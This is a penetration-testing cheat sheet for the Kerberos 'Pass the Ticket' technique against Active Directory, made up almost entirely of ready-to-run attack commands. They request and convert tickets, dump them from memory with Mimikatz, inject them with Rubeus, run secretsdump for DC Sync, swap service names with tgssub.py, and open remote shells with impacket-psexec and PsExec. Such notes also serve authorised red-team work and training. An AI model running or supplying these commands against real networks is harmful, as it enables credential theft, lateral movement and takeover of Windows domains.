# Pass the Ticket (ccache / kirbi)

## Tools: mimikatz , rubeus , impacket , ticketConverter.py , secretsdump , tgssub.py

## Steps:

### 1) Request a TGT or a ST

    getTGT.py -dc-ip <DC_IP> domain.local/user1:password

    getST.py -spn "cifs/target.domain.local" -dc-ip <DC_IP> domain.local/user1:password

### 2) Use the tickets

Load a kerberos ticket in .ccache format : export KRB5CCNAME=./ticket.ccache

## Globally, all the Impacket tools and the ones that use the library can authenticate via Kerberos with the -k -no-pass command line parameter instead of specifying the password. For ldeep it's -k.

For NetExec it is -k with credentials to perform the whole Kerberos process and authenticate with the ticket. If a .ccache ticket is already in memory, it is -k --use-kcache.

https://hideandsec.sh/link/71#bkmrk-for-evil-winrm-it%27s-
 
For evil-winrm it's -r <domain> --spn <SPN_prefix> (default 'HTTP'). The realm must be specified in the file /etc/krb5.conf using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }

If the Kerberos ticket is in .kirbi format it can be converted like this in the below command:

# Convert format (Use this depending on use case)

    ticketConverter.py KIRBI||CCACHE CCACHE||KIRBI (Convert tickets to the appropriate format)

## Convert Base64 ticket to both .ccache and .kirbi https://github.com/SolomonSklash/RubeusToCcache

    python3 rubeustoccache.py <Base64Ticket> <Output.kirbi> <Output.ccache>

#### 1) Rubeus

    Rubeus.exe ptt /ticket:TICKET

#### 2) Mimikatz

    mimikatz kerberos::ptc "TICKET"

#### 3) secretsdump

    [proxychains] secretsdump.py -k 'DOMAIN'/'USER'@'IP' (See DC Sync)

#### 4) impacket tools (Grant System/Admin access)

    export KRB5CCNAME=/path/to/TICKET.CCACHE

    impacket-psexec -k -no-pass USER@IP (Example)

#### 5) tgssub.py 

### Modify SPN

    tgssub.py -in TICKET.CCACHE -out NEW_TICKET.CCACHE -altservice "SERVICE/TARGET" (Pass the Ticket)

### Tool: Mimikatz

     Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

OR

#### 1) 

    privilege::debug

#### 2) 
    sekurlsa::tickets /export

#### 3) 
    
    kerberos::ptt TICKET.kirbi

#### 
    
    klist

### TIP: TGTs = Admin Credentials.

#### Access to any service the user is allowed to access.

### TGSs=Low-privileged account

## Alternate Method: Rubeus

    .\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi

    klist

    .\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
